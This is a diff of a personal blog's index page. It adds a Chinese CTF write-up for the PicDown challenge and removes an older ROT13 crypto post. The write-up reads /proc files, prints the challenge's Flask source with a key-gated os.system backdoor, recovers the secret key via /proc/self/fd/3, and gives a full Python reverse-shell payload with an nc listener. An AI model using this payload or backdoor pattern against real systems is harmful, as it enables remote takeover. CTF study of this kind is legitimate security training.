@@ -113,7 +113,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">117</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -131,6 +131,97 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/02/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="why">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="why">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | why">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/06/02/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/" class="post-title-link" itemprop="url">[网鼎杯 2020 白虎组]PicDown</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-02 19:24:23 / 修改时间：21:04:13" itemprop="dateCreated datePublished" datetime="2024-06-02T19:24:23+08:00">2024-06-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193405974.png" alt="image-20240602193405974"></p>
+<p>不是，你这，我那</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193418102.png" alt="image-20240602193418102"></p>
+<p>这就？</p>
+<p>啊！？</p>
+<p>反正肯定不是预期解，看看真正的解法吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/cmdline    </span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193613205.png" alt="image-20240602193613205"></p>
+<p>读取app.py，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line">//定义secretkey，然后删除</span><br><span class="line">//但是没有关闭，所以可以在/proc/self/fd/xxx中找到</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line">//定义了一个文件读取的功能</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line">//传两个参数，如果key == SECRET_KEY，那么就可以执行命令，但是没有回显，可以用来反弹shell.</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以读取一下key</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>
+
+<p>这数字是一个一个试，试到三就行</p>
+<p>读取到TqaOFuu2Sk29nB9Pc2s5wPKrWv&#x2F;jknWSId5SFyNg7A4&#x3D;</p>
+<p>所以进行shell反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=lxzY3xvJIDngLAx7RogcmxYWJX5MOWEKSCyT36xso7k=&amp;shell=python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>反弹之后直接cat就好</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -920,93 +1011,6 @@
 <p>直接秒杀</p>
 <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531213657994.png" alt="image-20240531213657994"></p>
 <p>ok了老铁</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/%E5%A4%A7%E5%B8%9D%E7%9A%84%E5%AF%86%E7%A0%81%E6%AD%A6%E5%99%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="why">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="why">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | why">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/%E5%A4%A7%E5%B8%9D%E7%9A%84%E5%AF%86%E7%A0%81%E6%AD%A6%E5%99%A8/" class="post-title-link" itemprop="url">大帝的密码武器</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-05-31 21:01:47" itemprop="dateCreated datePublished" datetime="2024-05-31T21:01:47+08:00">2024-05-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-06-21 21:57:38" itemprop="dateModified" datetime="2024-06-21T21:57:38+08:00">2024-06-21</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>将下载下来的文件zip重命名为zip.zip这个应该是作者没搞好</p>
-<p>之后我们会发现</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531210355240.png" alt="image-20240531210355240"></p>
-<p>和</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531210404328.png" alt="image-20240531210404328"></p>
-<p>按它说的来就好了</p>
-<p>先是</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531210438230.png" alt="image-20240531210438230"></p>
-<p>发现是13位（大部分都是）</p>
-<p>然后将ComeChina也编码加密一下（其实加密解密都一样）</p>
-<p>得到PbzrPuvan</p>
-<p>即flag{PbzrPuvan}</p>
 
       
     </div>
